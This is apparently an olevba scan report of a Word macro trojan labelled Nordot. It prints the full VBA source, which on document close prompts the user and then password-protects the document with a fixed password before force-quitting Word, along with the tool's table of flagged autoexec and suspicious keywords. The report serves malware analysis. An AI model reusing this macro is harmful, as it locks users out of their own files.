olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSExcel.Nordot.a-c57dae9fe197bb5787af84b8cdde3077db46db7d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSExcel.Nordot.a-c57dae9fe197bb5787af84b8cdde3077db46db7d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const JokeStr = "За справкаи обращайтесь в регистратуру. :))"
Const Author = "Автор: Таинственный Билли."
Const FinalStr = "Ваш документ зашифрован, а Word сейчас закроется."
Const FileOpenStr = "Предлагаю Вам попробовать попозже."
Const MustToCloseStr = "Вы действительно хотите закрть документ паролем и затем закрыть Word?"

Sub autoexec()
    Dim exist As Boolean
    exist = False
    If Normal.ThisDocument.Variables.Count > 0 Then
        For i = 1 To Normal.ThisDocument.Variables.Count
            If Normal.ThisDocument.Variables.Item(i).Name = "MyFileName" Then
                exist = True
            End If
        Next i
        If exist = False Then
            Normal.ThisDocument.Variables.Add Name:="MyFileName"
        End If
    End If
End Sub

Sub BADFUN()
    Dim MyFileName As String
    MyFileName = Normal.ThisDocument.Variables("MyFileName")
    Dim FSO As FileSystemObject
    Dim doc As Document
    Dim MyFILE As FILE
    Dim oldatr As FileAttribute
    Set FSO = New FileSystemObject
    Set MyFILE = FSO.GetFile(MyFileName)
    oldatr = MyFILE.Attributes
    MyFILE.Attributes = Archive
     
    Set doc = Documents.Open(MyFileName)
    doc.Password = "Stocona"
    doc.Saved = False
    doc.Variables.Add Name:="AlreadyEnciphered"
    doc.Close SAVECHANGES:=wdSaveChanges
    
    Form1.Show False
    Application.OnTime When:=Now + TimeValue("00:00:02"), _
    Name:="CloseForm"
    
    MyFILE.Attributes = oldatr
    Set MyFILE = Nothing
    Set FSO = Nothing
End Sub

Sub BADFUN_STARTER()
    BADFUN
End Sub

Private Sub Document_Close()
    If ActiveDocument.Variables.Count > 0 Then
        For i = 1 To ActiveDocument.Variables.Count
            If ActiveDocument.Variables.Item(i).Name = "AlreadyEnciphered" Then
                Exit Sub
            End If
        Next i
    End If
    
    If (ActiveDocument.Name = ActiveDocument.FullName) Then
    Else
        If (MsgBox(MustToCloseStr, vbYesNo, ActiveDocument.FullName) = vbYes) Then
        Normal.ThisDocument.Variables("MyFileName") = ActiveDocument.FullName
        Application.OnTime When:=Now + TimeValue("00:00:01"), _
        Name:="BADFUN_STARTER"
        End If
    End If
End Sub

Sub help()
    MsgBox JokeStr, , Author
End Sub

Sub helptool()
    MsgBox JokeStr, , Author
End Sub

Sub helpabout()
    MsgBox JokeStr, , Author
End Sub

Sub FileOpen()
    MsgBox FileOpenStr, , Author
End Sub

Sub CloseForm()
    Form1.Hide
    While Documents.Count > 0
        Documents(1).Close SAVECHANGES:=wdDoNotSaveChanges
    Wend
    Application.Quit
End Sub

-------------------------------------------------------------------------------
VBA MACRO Form1.frm 
in file: Trojan.MSExcel.Nordot.a-c57dae9fe197bb5787af84b8cdde3077db46db7d - OLE stream: 'Macros/VBA/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Nordot.a-c57dae9fe197bb5787af84b8cdde3077db46db7d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaa
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Trojan.MSExcel.Nordot.a-c57dae9fe197bb5787af84b8cdde3077db46db7d' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

